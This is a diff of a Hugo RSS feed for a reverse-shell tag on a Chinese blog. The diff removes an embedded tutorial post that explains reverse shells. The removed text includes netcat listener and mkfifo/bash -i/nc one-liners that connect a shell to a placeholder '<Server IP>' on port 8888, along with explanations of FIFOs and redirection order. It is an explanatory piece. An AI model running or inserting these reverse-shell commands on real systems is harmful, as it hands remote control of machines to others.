@@ -1,156 +1,25 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>反弹shell on singleye</title>
-    <link>/tags/%E5%8F%8D%E5%BC%B9shell/</link>
-    <description>singleye (反弹shell)</description>
+    <title>反弹shell on 好奇心是探索未知世界的钥匙</title>
+    <link>https://www.singleye.net/tags/%E5%8F%8D%E5%BC%B9shell/</link>
+    <description>Recent content in 反弹shell on 好奇心是探索未知世界的钥匙</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>zh-cn</language>
-    <managingEditor>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</managingEditor>
-    <webMaster>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</webMaster>
     <lastBuildDate>Mon, 09 Apr 2018 23:59:32 +0800</lastBuildDate>
     
-    <atom:link href="/tags/%E5%8F%8D%E5%BC%B9shell/index.xml" rel="self" type="application/rss+xml" />
+	<atom:link href="https://www.singleye.net/tags/%E5%8F%8D%E5%BC%B9shell/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
       <title>说一说反弹shell</title>
-      <link>/2018/04/%E8%AF%B4%E4%B8%80%E8%AF%B4%E5%8F%8D%E5%BC%B9shell/</link>
+      <link>https://www.singleye.net/2018/04/%E8%AF%B4%E4%B8%80%E8%AF%B4%E5%8F%8D%E5%BC%B9shell/</link>
       <pubDate>Mon, 09 Apr 2018 23:59:32 +0800</pubDate>
-      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
-      <guid>/2018/04/%E8%AF%B4%E4%B8%80%E8%AF%B4%E5%8F%8D%E5%BC%B9shell/</guid>
+      
+      <guid>https://www.singleye.net/2018/04/%E8%AF%B4%E4%B8%80%E8%AF%B4%E5%8F%8D%E5%BC%B9shell/</guid>
       <description>&lt;!--toc--&gt;
-&lt;p&gt;今天简单研究了一下什么是反弹shell以及怎么构造反弹shell，简单总结一下。&lt;/p&gt;
-&lt;h1 id=&#34;什么是反弹shell&#34; &gt;
-&lt;div&gt;
-    &lt;a href=&#34;#%e4%bb%80%e4%b9%88%e6%98%af%e5%8f%8d%e5%bc%b9shell&#34;&gt;
-        ##
-    &lt;/a&gt;
-    什么是反弹shell?
-&lt;/div&gt;
-&lt;/h1&gt;
-&lt;p&gt;先说一下我是怎么理解反弹shell的。正常情况下从本地控制远程的一台机器可以通过远程登陆（比如ssh/telnet）从本地向远程的机器主动建立连接进行控制，就是说本地是client，远程被控机是server。反弹shell（也叫reverse shell）就是把方向反过来，从远程被控主机向本地建立连接，即远程被控机是client，本地是server。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2018/04/ReverseShell/ReverseShellConn.png&#34; alt=&#34;ReverseShell&#34;&gt;&lt;/p&gt;
-&lt;h1 id=&#34;建立反弹shell&#34; &gt;
-&lt;div&gt;
-    &lt;a href=&#34;#%e5%bb%ba%e7%ab%8b%e5%8f%8d%e5%bc%b9shell&#34;&gt;
-        ##
-    &lt;/a&gt;
-    建立反弹shell
-&lt;/div&gt;
-&lt;/h1&gt;
-&lt;h2 id=&#34;建立本地server&#34; &gt;
-&lt;div&gt;
-    &lt;a href=&#34;#%e5%bb%ba%e7%ab%8b%e6%9c%ac%e5%9c%b0server&#34;&gt;
-        #
-    &lt;/a&gt;
-    建立本地server
-&lt;/div&gt;
-&lt;/h2&gt;
-&lt;p&gt;使用&amp;rsquo;nc&amp;rsquo;在本地建立server进行网络连接监听，本例子监听在8888端口上。&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ nc -lvp &lt;span style=&#34;color:#ff9f43&#34;&gt;8888&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;建立远程client&#34; &gt;
-&lt;div&gt;
-    &lt;a href=&#34;#%e5%bb%ba%e7%ab%8b%e8%bf%9c%e7%a8%8bclient&#34;&gt;
-        #
-    &lt;/a&gt;
-    建立远程client
-&lt;/div&gt;
-&lt;/h2&gt;
-&lt;h3 id=&#34;方法1-在远程被控机上用nc建立client进行连接&#34; &gt;
-&lt;div&gt;
-    &lt;a href=&#34;#%e6%96%b9%e6%b3%951-%e5%9c%a8%e8%bf%9c%e7%a8%8b%e8%a2%ab%e6%8e%a7%e6%9c%ba%e4%b8%8a%e7%94%a8nc%e5%bb%ba%e7%ab%8bclient%e8%bf%9b%e8%a1%8c%e8%bf%9e%e6%8e%a5&#34;&gt;
-        ##
-    &lt;/a&gt;
-    方法1: 在远程被控机上用nc建立client进行连接。
-&lt;/div&gt;
-&lt;/h3&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ mkfifo /tmp/f
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ cat /tmp/f | bash -i 2&amp;gt;&amp;amp;&lt;span style=&#34;color:#ff9f43&#34;&gt;1&lt;/span&gt; | nc &amp;lt;Server IP&amp;gt; &lt;span style=&#34;color:#ff9f43&#34;&gt;8888&lt;/span&gt; &amp;gt; /tmp/f
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol&gt;
-&lt;li&gt;**&amp;lsquo;mkfifo /tmp/f&amp;rsquo;**创建有名管道，有名管道可以通过文件的方式开放管道的两端，一端可以写另外一端读取写入的内容。&lt;/li&gt;
-&lt;li&gt;**&amp;lsquo;cat /tmp/f&amp;rsquo;**读取有名管道中的内容，读取的内容通过管道&amp;rsquo;|&amp;lsquo;写入&amp;rsquo;bash&amp;rsquo;&lt;/li&gt;
-&lt;li&gt;**&amp;lsquo;bash -i 2&amp;gt;&amp;amp;1&amp;rsquo;**建立交互式shell，并把标准错误合并到标准输出，然后通过管道&amp;rsquo;|&amp;lsquo;发给&amp;rsquo;nc&amp;rsquo;客户端&lt;/li&gt;
-&lt;li&gt;**&amp;rsquo;nc &lt;Server IP&gt; 8888 &amp;gt; /tmp/f&amp;rsquo;**向server发起连接，并把从server端接收到的内容写入&amp;rsquo;/tmp/f&amp;rsquo;，注意，这些写到&amp;rsquo;/tmp/f&amp;rsquo;的内容又被上面步骤&#39;2&amp;rsquo;读出来写会给shell&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;好吧，是不是有些绕？再捋一下，前面的那一串命令建立了一个连接，该连接通过&amp;rsquo;nc&amp;rsquo;与server端进行连接，server端的输入会被发送到client端的&amp;rsquo;nc&amp;rsquo;并写入&amp;rsquo;/tmp/f&amp;rsquo;，之后被&amp;rsquo;cat&amp;rsquo;读出来发给shell执行。shell的执行输出通过&amp;rsquo;nc&amp;rsquo;发给server。连接的图示如下：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2018/04/ReverseShell/ReverseShellConn-001.png&#34; alt=&#34;示意图&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;方法2在远程机上用建立连接&#34; &gt;
-&lt;div&gt;
-    &lt;a href=&#34;#%e6%96%b9%e6%b3%952%e5%9c%a8%e8%bf%9c%e7%a8%8b%e6%9c%ba%e4%b8%8a%e7%94%a8%e5%bb%ba%e7%ab%8b%e8%bf%9e%e6%8e%a5&#34;&gt;
-        ##
-    &lt;/a&gt;
-    方法2:在远程机上用建立连接
-&lt;/div&gt;
-&lt;/h3&gt;
-&lt;p&gt;前面的方法1中不太简洁的地方是使用了‘cat’，那么能不能再简化一下呢？当然有！先画一张连接拓扑图。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2018/04/ReverseShell/ReverseShellConn-002.png&#34; alt=&#34;示意图&#34;&gt;&lt;/p&gt;
-&lt;p&gt;建立方法命令如下：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mkfifo /tmp/f
-bash -i 2&amp;gt;&amp;amp;1 &amp;lt; /tmp/f | nc &amp;lt;Server IP&amp;gt; 8888 &amp;gt; /tmp/f
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;方法3&#34; &gt;
-&lt;div&gt;
-    &lt;a href=&#34;#%e6%96%b9%e6%b3%953&#34;&gt;
-        ##
-    &lt;/a&gt;
-    方法3:
-&lt;/div&gt;
-&lt;/h3&gt;
-&lt;p&gt;了解了上面的方法后不禁想问Client端的数据流反转是否可行？当然可以！还是看图说话。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2018/04/ReverseShell/ReverseShellConn-003.png&#34; alt=&#34;示意图&#34;&gt;&lt;/p&gt;
-&lt;p&gt;建立连接方法如下：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mkfifo /tmp/f
-nc &amp;lt;Server IP&amp;gt; 8888 &amp;lt; /tmp/f | bash -i  &amp;gt; /tmp/f 2&amp;gt;&amp;amp;1
-&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;其他话题&#34; &gt;
-&lt;div&gt;
-    &lt;a href=&#34;#%e5%85%b6%e4%bb%96%e8%af%9d%e9%a2%98&#34;&gt;
-        ##
-    &lt;/a&gt;
-    其他话题
-&lt;/div&gt;
-&lt;/h1&gt;
-&lt;h2 id=&#34;1-啥是fifo&#34; &gt;
-&lt;div&gt;
-    &lt;a href=&#34;#1-%e5%95%a5%e6%98%affifo&#34;&gt;
-        #
-    &lt;/a&gt;
-    1. 啥是FIFO？
-&lt;/div&gt;
-&lt;/h2&gt;
-&lt;p&gt;“FIFO”是Linux操作系统上面一种特殊的进程间通讯的手段，类似管道“PIPE”，相同之处：&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;都是进程间通讯的手段，可用于传递消息&lt;/li&gt;
-&lt;li&gt;都是“半双工单向”数据流模式&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;但不同之处在于：&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;“PIPE”创建的管道存在于父/子进程之间，通常是fork()出来的父子进程间使用。&lt;/li&gt;
-&lt;li&gt;“FIFO”有名管道顾名思义是有名字的，名字就是文件系统中创建出来的问题件，这样就可以支持不同的进程之间使用这个管道进行通信了。&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;想知道的更详细些可以阅读经典的《UNIX环境高级编程》。&lt;/p&gt;
-&lt;h2 id=&#34;2-思考一下下面的两个命令有什么不同&#34; &gt;
-&lt;div&gt;
-    &lt;a href=&#34;#2-%e6%80%9d%e8%80%83%e4%b8%80%e4%b8%8b%e4%b8%8b%e9%9d%a2%e7%9a%84%e4%b8%a4%e4%b8%aa%e5%91%bd%e4%bb%a4%e6%9c%89%e4%bb%80%e4%b9%88%e4%b8%8d%e5%90%8c&#34;&gt;
-        #
-    &lt;/a&gt;
-    2. 思考一下下面的两个命令有什么不同？
-&lt;/div&gt;
-&lt;/h2&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nc &amp;lt;Server IP&amp;gt; 8888 &amp;lt; /tmp/f | bash -i 2&amp;gt;&amp;amp;1 &amp;gt; /tmp/f
 
-nc &amp;lt;Server IP&amp;gt; 8888 &amp;lt; /tmp/f | bash -i  &amp;gt; /tmp/f 2&amp;gt;&amp;amp;1
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;不同之处是**&amp;ldquo;2&amp;gt;&amp;amp;1 &amp;gt; /tmp/f&amp;rdquo;&lt;strong&gt;和&lt;/strong&gt;&amp;quot;&amp;gt; /tmp/f 2&amp;gt;&amp;amp;1&amp;quot;**。&lt;/p&gt;
-&lt;p&gt;**&amp;quot;&amp;gt; /tmp/f 2&amp;gt;&amp;amp;1&amp;quot;&lt;strong&gt;可以正确将标准输出与标准错误合并后导入&amp;quot;/tmp/f&amp;quot;，而&lt;/strong&gt;&amp;ldquo;2&amp;gt;&amp;amp;1 &amp;gt; /tmp/f&amp;rdquo;**最终只把标准输出导入了&amp;quot;/tmp/f&amp;quot;，标准错误还是没有，那么是为什么呢？&lt;/p&gt;
-&lt;p&gt;先分析一下正常**&amp;quot;&amp;gt; /tmp/f 2&amp;gt;&amp;amp;1&amp;quot;**的执行过程。&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;先解析**&amp;quot;&amp;gt; /tmp/f&amp;quot;**的时候进程会把标准输出&amp;quot;1&amp;quot;定向到FIFO文件&amp;quot;/tmp/f&amp;quot;&lt;/li&gt;
-&lt;li&gt;再解析**&amp;ldquo;2&amp;gt;&amp;amp;1&amp;rdquo;**的时候，进程的标准错误“2”定向到了标准输出“1”对应的目标，由于此时“1”指向了&amp;quot;/tmp/f&amp;quot;，那么自然标准错误“2”也被定向到了这个FIFO文件。&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;再分析一下异常**&amp;ldquo;2&amp;gt;&amp;amp;1 &amp;gt; /tmp/f&amp;rdquo;**的执行过程。&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;首先**&amp;ldquo;2&amp;gt;&amp;amp;1&amp;rdquo;**在执行的时候是把进程的标准错误“2”定向到了标准输出“1”对应的目标，这个目标此时是进程执行的“终端”。&lt;/li&gt;
-&lt;li&gt;当解析到**&amp;quot;&amp;gt; /tmp/f&amp;quot;**的时候进程会把标准输出&amp;quot;1&amp;quot;定向到FIFO文件&amp;quot;/tmp/f&amp;quot;，而此时标准错误“2”还是指向前一步中定向的“终端”，因此造成了执行的问题。&lt;/li&gt;
-&lt;/ol&gt;</description>
+&lt;p&gt;&lt;/p&gt;</description>
     </item>
     
   </channel>
